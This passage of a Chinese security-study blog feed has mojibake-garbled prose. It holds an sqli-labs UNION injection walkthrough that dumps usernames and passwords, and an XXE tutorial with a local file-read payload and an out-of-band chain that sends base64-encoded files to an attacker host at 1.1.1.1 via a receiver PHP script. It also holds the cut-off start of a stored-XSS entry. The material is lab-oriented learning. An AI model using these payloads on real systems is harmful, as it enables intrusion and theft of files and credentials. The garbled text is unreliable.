        <content type="html"><![CDATA[<p><br>(åœ¨è¿™é‡Œæˆ‘ä»¬ç”¨sqli-labä¸ºä¾‹)<br><br><strong>æˆ‘ä»¬é¦–å…ˆè¦æ£€æŸ¥æ˜¯å¦ä¼šæœ‰æ³¨å…¥æ¼æ´ï¼Œand 1=1æ³•æ˜¾ç¤ºä¸å‡ºé”™è¯¯ä¿¡æ¯ï¼Œæˆ‘ä»¬å°è¯•ç”¨â€™æµ‹è¯•ï¼Œå‘ç°å‡ºç°é”™è¯¯ä¿¡æ¯ï¼Œä¹Ÿè¯æ˜æœ‰æ³¨å…¥æ¼æ´ã€‚<br></strong><br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/sxw6wE4Na9CwDf2J95VFD5xdrWGvCDy8zYhOwrWEgRY!/b/dFIBAAAAAAAA&amp;bo=gQb5AIEG.QADCSw!&amp;rf=viewer_4" alt><br><strong><br>æˆ‘ä»¬æ ¹æ®é”™è¯¯ä¿¡æ¯çŸ¥é“å¤šå‡ºä¸€ä¸ªå¤šä½™çš„â€™ é‚£æˆ‘ä»¬åº”è¯¥æ€ä¹ˆæ ·æ‰èƒ½ä½¿å¤šä½™çš„â€™ è¯­æ³•è®©sqlè¯­å¥æ­£ç¡®å›æ˜¾å‘¢?<br></strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure></p><p><strong>æˆ‘ä»¬é€šè¿‡æ³¨é‡Šåé¢çš„è¯­å¥æ³¨é‡Šæ‰ï¼Œä½¿å¾—å¼•å·é—­åˆï¼›</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos;--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/4tl2YYuvPIdxpHq7.lhk5zQhLLEB8fqesx4UuLyV.PU!/b/dFMBAAAAAAAA&amp;bo=IgVTASIFUwEDGTw!&amp;rf=viewer_4" alt><br><strong>æµ‹è¯•å­—æ®µæ•°,å‘ç°order by 4å‡ºé”™ï¼Œ3åˆ™æ­£å¸¸æ˜¾ç¤ºï¼Œè¯´æ˜å­—æ®µä¸º3<br>ï¼ˆorder by æ˜¯mysqlç”¨æ¥æ’åºçš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»–æ¥æµ‹è¯•å­—æ®µæ•°ï¼‰ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos; order by 3--+</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•å›æ˜¾ç‚¹ï¼Œå‘ç°å›æ˜¾ä½æ˜¯2ï¼Œ3</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/u7xpdeuVSeeKngk.j13h3LAfU1eMVgdCH9T.CWlDrHo!/b/dL8AAAAAAAAA&amp;bo=qwShAAAAAAADByw!&amp;rf=viewer_4" alt></p><p><strong>æŸ¥è¯¢ç‰ˆæœ¬å·ï¼Œå¦‚æœæ˜¯5.0ä»¥ä¸Š,åˆ™å¯ä»¥ç”¨ç³»ç»Ÿåº“æŸ¥è¯¢</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,version()--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.kj.wKY22UkPB5mLbk*udHdjiJAigOznbz0cagNMwHY!/b/dLgAAAAAAAAA&amp;bo=EAXjAAAAAAADB9Q!&amp;rf=viewer_4" alt></p><p><strong>æŸ¥è¯¢æ•°æ®åº“å</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,database()--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.5pOBR2yPrgiR7sZUOs61G1LI6Xy58TDwHEpGb6Lb2g!/b/dFQBAAAAAAAA&amp;bo=NgbXAAAAAAADF9U!&amp;rf=viewer_4" alt><br><strong>é€šè¿‡æ•°æ®åº“ ç³»ç»Ÿåº“informationçš„tablesè¡¨æŸ¥è¯¢è¡¨å(æŸ¥è¯¢ä¸‹ä¸ªè¡¨ï¼Œå¯ä»¥é€šè¿‡ç§»åŠ¨åç§»é‡limitæ¥æŸ¥è¯¢å…¶ä»–è¡¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1 --+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/F5g.75Q1PLQjwcFR2.hGo5O2VJ1mX0GKK4WHq7Pf9D8!/b/dL8AAAAAAAAA&amp;bo=5wTDAAAAAAADFxI!&amp;rf=viewer_4" alt></p><p><strong>å†é€šè¿‡æ•°æ®åº“ ç³»ç»Ÿåº“çš„columnsè¡¨æŸ¥è¯¢åˆ—åï¼Œé€šè¿‡åç§»limitæ¥æŸ¥è¯¢å…¶ä»–å­—æ®µ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1 --+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/fogWx.4zppoo.XE51.8tPeW1tXIixEwyu.UH0prXdoA!/b/dLYAAAAAAAAA&amp;bo=zAStAAAAAAADF1c!&amp;rf=viewer_4" alt></p><p><strong>å†æ¥çˆ†å‡ºå­—æ®µé‡Œçš„å†…å®¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,username,password from users limit 0,1--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8LCHPGYOTX9e53SycijT5Py2a73o5bRbPKRZ3eFnNtQ!/b/dL8AAAAAAAAA&amp;bo=pAXIAAAAAAADB0s!&amp;rf=viewer_4" alt></p><h1 id="group-concatå‡½æ•°ï¼š"><a href="#group-concatå‡½æ•°ï¼š" class="headerlink" title="group_concatå‡½æ•°ï¼š"></a>group_concatå‡½æ•°ï¼š</h1><p>group_concatå‡½æ•°çš„ä½œç”¨å°†åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸ç”¨éº»çƒ¦çš„å»ç§»åŠ¨åç§»é‡äº†ã€‚<br><a href="http://www.cnblogs.com/lcamry/p/5715634.html" target="_blank" rel="noopener">å‡½æ•°å…·ä½“ä»‹ç»</a></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE-å®ä½“æ³¨å…¥</title>
      <link href="/2019/12/07/XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/12/07/XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="XXEä»‹ç»"><a href="#XXEä»‹ç»" class="headerlink" title="XXEä»‹ç»"></a>XXEä»‹ç»</h2><p><strong>XXEå³å¤–éƒ¨å®ä½“ï¼Œä»å®‰å…¨è§’åº¦ç†è§£ä¸ºXMLå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»</strong></p><p>XMLç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ï¼Œå¯ä»¥ç”¨æ¥æ ‡è®°æ•°æ®ã€å®šä¹‰æ•°æ®ç±»å‹ï¼Œæ˜¯ä¸€ç§å…è®¸ç”¨æˆ·å¯¹è‡ªå·±çš„æ ‡è®°è¯­è¨€è¿›è¡Œå®šä¹‰çš„æºè¯­è¨€ã€‚XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cwsvo56lj30xq0fvwiv.jpg" alt></p><p>æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚</p><p>DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äº XML æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚</p><h4 id="å†…éƒ¨DTDå£°æ˜"><a href="#å†…éƒ¨DTDå£°æ˜" class="headerlink" title="å†…éƒ¨DTDå£°æ˜:"></a>å†…éƒ¨DTDå£°æ˜:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</span><br></pre></td></tr></table></figure><p><strong>å®ä¾‹ï¼š</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><h4 id="å¼•ç”¨å¤–éƒ¨DTDå£°æ˜"><a href="#å¼•ç”¨å¤–éƒ¨DTDå£°æ˜" class="headerlink" title="å¼•ç”¨å¤–éƒ¨DTDå£°æ˜:"></a>å¼•ç”¨å¤–éƒ¨DTDå£°æ˜:</h4><p><code>&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;</code></p><p>æˆ–è€…</p><p><code>&lt;!DOCTYPE æ ¹å…ƒç´  PUBLIC &quot;public_ID&quot; &quot;æ–‡ä»¶å&quot;&gt;s</code></p><p><strong>å®ä¾‹</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><p>è¿™æ˜¯åŒ…å« DTD çš„ â€œnote.dtdâ€ æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h2 id="DTDå®ä½“"><a href="#DTDå®ä½“" class="headerlink" title="DTDå®ä½“"></a>DTDå®ä½“</h2><p>å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚</p><p>å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚</p><p>å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚</p><h3 id="1-ä¸€ä¸ªå¤–éƒ¨å®ä½“å£°æ˜"><a href="#1-ä¸€ä¸ªå¤–éƒ¨å®ä½“å£°æ˜" class="headerlink" title="1. ä¸€ä¸ªå¤–éƒ¨å®ä½“å£°æ˜"></a>1. <strong>ä¸€ä¸ªå¤–éƒ¨å®ä½“å£°æ˜</strong></h3><p>è¯­æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>DTD ä¾‹å­:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML ä¾‹å­:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h3 id="2-ä¸€ä¸ªå†…éƒ¨å®ä½“å£°æ˜"><a href="#2-ä¸€ä¸ªå†…éƒ¨å®ä½“å£°æ˜" class="headerlink" title="2. ä¸€ä¸ªå†…éƒ¨å®ä½“å£°æ˜"></a>2. <strong>ä¸€ä¸ªå†…éƒ¨å®ä½“å£°æ˜</strong></h3><p>è¯­æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</span><br></pre></td></tr></table></figure><p>DTD ä¾‹å­:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML ä¾‹å­:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><p><strong>å®ä½“åˆåˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“:</strong></p><ul><li>ä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“å â€œå®ä½“å†…å®¹â€œ&gt;</span><br></pre></td></tr></table></figure><p>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š&amp;å®ä½“åï¼›</p><ul><li>å‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­ä½¿ç”¨ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ ¼å¼ï¼š </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % å®ä½“å â€œå®ä½“å†…å®¹â€œ&gt;</span><br></pre></td></tr></table></figure><p>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š%å®ä½“åï¼›</p><p><strong>ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ: ä¸€ä¸ªå’Œå· (&amp;), ä¸€ä¸ªå®ä½“åç§°, ä»¥åŠä¸€ä¸ªåˆ†å· (;)ã€‚</strong></p><p><strong>ç®€å•XXEæ”»å‡»payload:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test=&apos;&lt;!DOCTYPE scan [&lt;!ENTITY test SYSTEM &quot;file:///c:/1.txt&quot;&gt;]&gt;&lt;scan&gt;&amp;test;&lt;/scan&gt;&apos;;</span><br><span class="line">$obj=simplexml_load_string($test,&apos;SimpleXMLElement&apos;,LIBXML_NOENT);</span><br><span class="line">print_r($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>testæ˜¯ä¸€ä¸ªå˜é‡ï¼Œé‡Œé¢æ˜¯XMLï¼Œè®¿é—®è¯»å–äº†Cç›˜çš„1.txtç„¶åä½¿ç”¨simplexml_load_stringå°†å…¶è½¬æ¢ä¸ºå¯¹è±¡æ‰“å°å‡ºæ¥</strong></p><h2 id="simplexml-load-string-å‡½æ•°"><a href="#simplexml-load-string-å‡½æ•°" class="headerlink" title="simplexml_load_string()å‡½æ•°"></a>simplexml_load_string()å‡½æ•°</h2><h3 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h3><p>æŠŠ XML å­—ç¬¦ä¸²è½½å…¥å¯¹è±¡ä¸­</p><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simplexml_load_string(_data,classname,options,ns,is_prefix_ );</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯xmlè¯­å¥ï¼ŒSimpleXMLElementæ˜¯è°ƒç”¨äº†SimpleXMlementè¿™ä¸ªç±»ï¼Œç„¶åLIBXML_NOETæ˜¯ä»£æ›¿å®ä½“ï¼Œç„¶åå»è°ƒç”¨æ–‡ä»¶cç›˜ä¸‹1.txtã€‚</p><p>åœ¨å®æˆ˜ä¸­åç«¯è¯­è¨€è§£æäº†XMLæ˜¯ä¸ä¼šè¾“å‡ºè¯»å–å†…å®¹çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç±»ä¼¼æ¥å—å¹³å°çš„æ¥æ”¶å™¨ï¼Œå°†XMLè¯»å–çš„æ•°æ®å‘é€åˆ°æ¥æ”¶å¹³å°ï¼Œç„¶åæ¥å—å¹³å°å‚¨å­˜ç„¶åæˆ‘ä»¬åœ¨æ¥å—å¹³å°ä¸Šåˆ†æã€‚å…ˆ<strong>ä½¿ç”¨PHPä¼ªåè®®è¯»å–æ–‡ä»¶ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure><p>ç„¶å<strong>å»è°ƒç”¨ ç”¨æ¥XXEçš„æœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªxmlæ–‡æ¡£æ–‡ä»¶ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://1.1.1.1/1.xml&quot;&gt;</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªXMLå†™çš„å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://1.1.1.1:8080/2.php?</span><br><span class="line">id=%file;&apos;&gt;&quot;</span><br><span class="line">\&gt;</span><br><span class="line">%all;      //è°ƒç”¨å®ä½“</span><br></pre></td></tr></table></figure><p><strong>1.XMLæ–‡æ¡£ä¼šè°ƒç”¨2.phpæ–‡ä»¶å¹¶å‘idé€šè¿‡GETæ–¹å¼ä¼ å…¥%file è¯»å–çš„å†…å®¹</strong><br>è€Œ2.phpçš„å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&apos;id&apos;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure><p>2.phpè¢«è°ƒç”¨åä¼šå°†idä¼ è¿›æ¥çš„å‚æ•°å³%fileçš„å†…å®¹å†™å…¥åˆ°3.phpä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è®¿é—®3.phpå¾—åˆ°æˆ‘ä»¬æƒ³è¯»å–çš„å†…å®¹ï¼›</p><h2 id="é¶åœºæ¼”ç¤º"><a href="#é¶åœºæ¼”ç¤º" class="headerlink" title="é¶åœºæ¼”ç¤º"></a>é¶åœºæ¼”ç¤º</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz0zbfttj31h00qm758.jpg" alt><br>è¿›å…¥XXEé¶åœºï¼ˆå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰ï¼Œæˆ‘ä»¬å‘ç°äº†<strong>simplexml_load_string()å‡½æ•°</strong>ï¼Œè¿™é‡Œå¾ˆå¯èƒ½æœ‰XXEæ¼æ´ï¼Œæˆ‘ä»¬çœ‹äº†ä¸‹é™„ä»¶ä»£ç ä»¶ï¼š<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1dhaqqj317w0npwn1.jpg" alt><br>å‘ç°è¿™é‡Œé€šè¿‡$poststræ¥æ”¶æ•°æ®å¹¶å°†æ•°æ®ç›´æ¥æ”¾å…¥åˆ°simplexml_load_string()è½¬æ¢ä¸ºå¯¹è±¡ï¼Œé‚£è¿™é‡Œæ˜¯å¯ä»¥è¿›è¡ŒXXEçš„ï¼›</p><p>æˆ‘ä»¬å…ˆæ„é€ å‡ºXXEçš„pocä»£ç ï¼š<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1pp4y0j313v05lt9p.jpg" alt><br>ç¬¬ä¸‰è¡Œæ˜¯é€šè¿‡phpä¼ªåè®®å»è¯»å–<strong>è¢«æ”»å‡»æœåŠ¡å™¨</strong>ä¸‹çš„<strong>flag.php</strong>æ–‡ä»¶å†…å®¹ï¼ˆbase64ç¼–ç ï¼Œæ–¹ä¾¿æ•°æ®ä¼ è¾“ï¼‰</p><p>ç¬¬å››è¡Œæ˜¯é€šè¿‡å¤–éƒ¨å®ä½“å£°æ˜åŠ è½½<strong>æ”»å‡»è€…æœåŠ¡å™¨</strong>çš„<strong>1.xml</strong>æ–‡ä»¶</p><p>ç¬¬äº”è¡Œè°ƒç”¨å¤–éƒ¨å®ä½“remote</p><p>ç¬¬å…­è¡Œè°ƒç”¨å¤–éƒ¨å®ä½“send</p><p><strong>1.xml</strong>æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://1.1.1.1:8080/xxe/2.php?id=%file;&apos;&gt;&quot;</span><br><span class="line"> \&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p><strong>è°ƒç”¨2.phpå¹¶ä¼ å…¥å‚æ•°</strong></p><p><strong>2.phpå†…å®¹å¦‚ä¸‹ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&apos;id&apos;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure><p>å°†ä¼ å‚çš„å†…å®¹ï¼Œå³è¯»å–åˆ°çš„æ–‡ä»¶å†™å…¥æ”¾åˆ°3.txtä¸­ï¼ŒæˆåŠŸè¯»å–æ–‡ä»¶</p><p>æŠ“åŒ…ï¼Œé€šè¿‡POSTæ–¹å¼ä¸Šä¼ <br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz21z8wsj31h60ra0y4.jpg" alt><br>è®¿é—®æ”»å‡»è€…ï¼ˆå³è‡ªå·±ï¼‰çš„æœåŠ¡å™¨ï¼Œçœ‹çœ‹3.txtæ˜¯å¦æ”¶åˆ°è¯»å–çš„æ–‡ä»¶<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz2cygdgj31h30psdfu.jpg" alt><br>æˆåŠŸè¯»å–åˆ°æ–‡ä»¶ï¼Œå› ä¸ºä¹‹å‰å¯¹å…¶è¿›è¡Œbase64ç¼–ç ï¼Œæ‰€ä»¥è¿›è¡Œbase64è§£ç å³å¯å¾—åˆ°åŸæ¥çš„å†…å®¹ï¼</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å­˜å‚¨å‹XSS</title>
      <link href="/2019/12/07/XSS2/"/>
      <url>/2019/12/07/XSS2/</url>
      
        <content type="html"><![CDATA[<p>XSS(è·¨ç«™è„šæœ¬æ”»å‡»)çš„åŸç†å…¶å®æˆ‘å·²ç»åœ¨ä¸Šç¯‡æ–‡ç« è¯´è¿‡äº†ï¼Œæ‰€ä»¥æˆ‘å°±ä¸è¯¦ç»†è§£é‡Šäº†ï¼Œæˆ‘ä»¬å°±è¯´è¯´xssæ¼æ´çš„ä¸¤å¤§æ ¹æœ¬æ¡ä»¶ï¼š</p><ul><li>ç”¨æˆ·è¦èƒ½æ§åˆ¶è¾“å…¥ï¼Œ</li><li>åŸæœ¬ç¨‹åºè¦æ‰§è¡Œçš„htmlä»£ç ï¼Œæ‹¼æ¥äº†ç”¨æˆ·è¾“å…¥çš„æ•°æ®</li></ul><h3 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h3><p>æŒ‡åµŒå…¥webé¡µé¢çš„æ¶æ„htmlä»£ç è¢«å­˜è¿›äº†åº”ç”¨æœåŠ¡å™¨ç«¯å»ï¼Œä¹Ÿå°±æ˜¯è¯´è¢«å­˜å‚¨åˆ°æ•°æ®åº“ä¸­å»ï¼Œåœ¨æ¯æ¬¡æœ‰äººè®¿é—®è¿™ä¸ªé¡µé¢ï¼Œéƒ½ä¼šè‡ªåŠ¨è§¦å‘æ¶æ„ä»£ç 